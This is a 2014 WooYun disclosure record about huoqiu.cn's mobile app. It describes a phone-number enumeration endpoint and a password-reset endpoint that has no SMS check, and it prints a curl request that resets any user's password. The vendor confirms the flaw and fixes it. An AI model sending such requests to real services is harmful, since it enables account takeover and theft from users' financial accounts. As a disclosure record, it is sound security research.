{"id": 48668, "wybug_id": "wooyun-2014-082201", "wybug_title": "火球网APP设计缺陷可导致任意用户密码重置附官方百万余额账户演示", "wybug_corp": "huoqiu.cn", "wybug_author": "秋风", "wybug_date": "2014-11-06 08:38", "wybug_open_date": "2014-12-21 08:42", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向公众公开  简要描述： 我有一只小毛驴，我从来也不骑。有一天我心血来潮骑着去赶集。我手里拿着小皮鞭我心里正得意。不知怎么哗啦啦啦啦啦，我摔了一身泥。 详细说明：  #0 手机号碰撞\n接口地址https://www.huoqiu.cn/mobile/login/phone/is_exist.json?phoneNum=13800138000&md5str=e2009584715d2bc28ec13251867ea066&csrf_time=1415197219841&hq_phone=true如果手机号不存在，返回json数据为{\"is_exist\":false,\"success\":true}如果手机号存在，返回json数据为{\"is_exist\":true,\"success\":true}拿某P2P平台数据做碰撞，贴出部分碰撞到手机号，这些用户是不是你们的，可自查，碰撞过程在这就不做演示了！***********137\n\nmask 区域\n\n*****14*****\n\n\n\n60*18\n\n\n\nmask 区域\n\n*****03*****\n\n\n\n6*18\n\n\n\nmask 区域\n\n*****30*****\n\n\n\n45*139\n\n\n\nmask 区域\n\n*****61*****\n\n\n\n0*135\n\n\n\nmask 区域\n\n*****52*****\n\n\n\n1*15\n\n\n\nmask 区域\n\n*****45*****\n\n\n\n15*15\n\n\n\nmask 区域\n\n*****61*****\n\n\n\n0*13\n\n\n\nmask 区域\n\n*****18*****\n\n\n\n8*15\n\n\n\nmask 区域\n\n*****20*****\n\n\n\n51*13\n\n\n\nmask 区域\n\n*****45*****\n\n\n\n14*18\n\n\n\nmask 区域\n\n*****15*****\n\n\n\n20*134\n\n\n\nmask 区域\n\n*****89*****\n\n\n\n56*18\n\n\n\nmask 区域\n\n*****43*****\n\n\n\n92*13\n\n\n\nmask 区域\n\n*****93*****\n\n\n\n55*18\n\n\n\nmask 区域\n\n*****28*****\n\n\n\n054*186\n\n\n\nmask 区域\n\n*****95*****\n\n\n\n1*15\n\n\n\nmask 区域\n\n*****38*****\n\n\n\n94*\n\n\n\nmask 区域\n\n*****39*****\n\n\n\n3317*1\n\n\n\nmask 区域\n\n*****99*****\n\n\n\n3615*18\n\n\n\nmask 区域\n\n*****15*****\n\n\n\n394************\n#1 重置用户密码接口\n接口地址https://www.huoqiu.cn/mobile/app/login_pwd/reset.json?cell=1338116****&password=123456&passwordRepeated=123456&md5str=dc17b75b4ab7ad5273dcf1396fbaeee3&csrf_time=1415195091957&hq_phone=trueGET必要参数说明cell->用户手机号码password->用户新密码passwordRepeated->确认密码后边几项存在越权，随便拿个账号自己去重置下密码，抓包保存即可，可复用。curl \"https://www.huoqiu.cn/mobile/app/login_pwd/reset.json?cell=1338*******&password=123456&passwordRepeated=123456&md5str=dc17b75b4ab7ad5273dcf1396fbaeee3&csrf_time=1415195091957&hq_phone=true\" --data \"\"如重置成功，服务器将返回：{\"message\":\"修改登录密码成功\",\"retcode\":0,\"success\":true}\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  说好的手机验证码呢？咋在这一步就玩儿丢了？土豪，我们做朋友可好？   版权声明：转载请注明来源 秋风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-06 11:23 厂商回复： 部分用户可能会受到影响。已暂停该功能，将尽快修复。感谢! 最新状态： 2014-11-06：已经修复.  ", "replys": "漏洞评价：\n评论\n     2014-11-13 11:30 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  看了漏洞简介，竟然情不自禁的唱出来了。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}